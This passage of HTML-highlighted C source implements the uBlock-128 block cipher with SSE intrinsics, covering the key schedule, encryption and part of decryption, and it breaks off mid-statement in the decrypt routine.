class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xa</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x8</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0xa</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xd</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x7</span>,<span class=\"number\">0x8</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0xc</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x9</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0xd</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0x3</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x6</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0x7</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>,</span><br><span class=\"line\"><span class=\"number\">0xa</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xb</span>,<span class=\"number\">0x5</span>,<span class=\"number\">0xf</span>,<span class=\"number\">0x0</span>,<span class=\"number\">0xe</span>,<span class=\"number\">0x4</span>,<span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">uBlock_128_KeySchedule</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key)</span><span class=\"comment\">// 密钥生成函数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t__m128i SK = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>, <span class=\"number\">3</span>, <span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">5</span>, <span class=\"number\">11</span>, <span class=\"number\">9</span>, <span class=\"number\">15</span>, <span class=\"number\">13</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c1 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c2 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>);\t\t</span><br><span class=\"line\">\t__m128i c3 = _mm_setr_epi8(<span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c4 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c5 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c6 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>);\t</span><br><span class=\"line\">\t__m128i c7 = _mm_setr_epi8(<span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>);\t</span><br><span class=\"line\">\t__m128i c8 = _mm_setr_epi8(<span class=\"number\">6</span>,<span class=\"number\">0</span>,<span class=\"number\">8</span>,<span class=\"number\">13</span>,<span class=\"number\">1</span>,<span class=\"number\">15</span>,<span class=\"number\">5</span>,<span class=\"number\">10</span>,<span class=\"number\">4</span>,<span class=\"number\">9</span>,<span class=\"number\">12</span>,<span class=\"number\">2</span>,<span class=\"number\">11</span>,<span class=\"number\">3</span>,<span class=\"number\">7</span>,<span class=\"number\">14</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i state1, state2, k, t1, t2, t3, t4;  </span><br><span class=\"line\"></span><br><span class=\"line\">\tstate2 = _mm_loadu_si128((__m128i*)key);</span><br><span class=\"line\">\tstate1 = _mm_srli_epi16(state2, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_and_si128(state1, con);</span><br><span class=\"line\">\tstate2 = _mm_and_si128(state2, con);</span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c1);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c2);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c3);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c4);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\t_mm_storeu_si128((__m128i*)Subkey[<span class=\"number\">0</span>], state1);</span><br><span class=\"line\">\t_mm_storeu_si128((__m128i*)(Subkey[<span class=\"number\">0</span>] + <span class=\"number\">16</span>), state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">1</span>; i &lt;= <span class=\"number\">16</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(state1, c8);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)RC[i - <span class=\"number\">1</span>]);</span><br><span class=\"line\">\t\tk = _mm_xor_si128(k, state1);</span><br><span class=\"line\">\t\tt1 =  _mm_shuffle_epi8(S, k);</span><br><span class=\"line\">\t\tt2 = _mm_shuffle_epi8(SK, k);</span><br><span class=\"line\">\t\tt3 = _mm_shuffle_epi8(t1, c5);</span><br><span class=\"line\">\t\tt4 = _mm_shuffle_epi8(t2, c6);</span><br><span class=\"line\">\t\tk = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tk = _mm_xor_si128(k, state2);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(state1, c7);</span><br><span class=\"line\">\t\tstate1 = k;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t_mm_storeu_si128((__m128i*)Subkey[i], state1);</span><br><span class=\"line\">\t\t_mm_storeu_si128((__m128i*)(Subkey[i] + <span class=\"number\">16</span>), state2);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">uBlock_128_Encrypt</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *plain, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *cipher, <span class=\"type\">int</span> round)</span><span class=\"comment\">//uBlock加密函数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t__m128i L1 = _mm_setr_epi8(<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>);\t\t</span><br><span class=\"line\">\t__m128i L2 = _mm_setr_epi8(<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c1 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c2 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>);\t\t</span><br><span class=\"line\">\t__m128i c3 = _mm_setr_epi8(<span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c4 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c5 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c6 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>);\t\t</span><br><span class=\"line\">\t__m128i c7 = _mm_setr_epi8(<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c8 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>);\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i state1, state2, k, t1, t2, t3, t4;  </span><br><span class=\"line\"></span><br><span class=\"line\">\tstate2 = _mm_loadu_si128((__m128i*)plain);</span><br><span class=\"line\">\tstate1 = _mm_srli_epi16(state2, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_and_si128(state1, con);</span><br><span class=\"line\">\tstate2 = _mm_and_si128(state2, con);</span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c1);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c2);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c3);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c4);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; round; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)Subkey[i]);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)(Subkey[i] + <span class=\"number\">16</span>));</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(S, state1);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(S, state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, state1);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state2, A1);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state1, A2);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state2, A2);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state1, A3);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(state1, L1);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(state2, L2);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(round == <span class=\"number\">16</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)Subkey[round]);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)(Subkey[round] + <span class=\"number\">16</span>));</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c5);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c6);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c7);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c8);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstate1 = _mm_slli_epi16(state1, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(state1, state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t_mm_storeu_si128((__m128i*)cipher, state1);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">uBlock_128_Decrypt</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *cipher, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *plain, <span class=\"type\">int</span> round)</span><span class=\"comment\">// uBlock解密函数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t__m128i L1 = _mm_setr_epi8(<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>);\t\t</span><br><span class=\"line\">\t__m128i L2 = _mm_setr_epi8(<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c1 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c2 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>);\t\t</span><br><span class=\"line\">\t__m128i c3 = _mm_setr_epi8(<span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c4 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c5 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c6 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>);\t\t</span><br><span class=\"line\">\t__m128i c7 = _mm_setr_epi8(<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c8 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>);\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i state1, state2, k, t1, t2, t3, t4;  </span><br><span class=\"line\"></span><br><span class=\"line\">\tstate2 = _mm_loadu_si128((__m128i*)cipher);</span><br><span class=\"line\">\tstate1 = _mm_srli_epi16(state2, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_and_si128(state1, con);</span><br><span class=\"line\">\tstate2 = _mm_and_si128(state2, con);</span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c1);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c2);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c3);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c4);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = round; i &gt; <span class=\"number\">0</span>; i--)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)Subkey[i]);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)(Subkey[i] + <span class=\"number\">16</span>));</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(state1, L1);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(state2, L2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, state2);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state1, A3);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state2, A2);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state1, A2);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state2, A1);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, state1);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(S_Inv, state1);</span><br><span class=\"line\">\t\tstate2 = 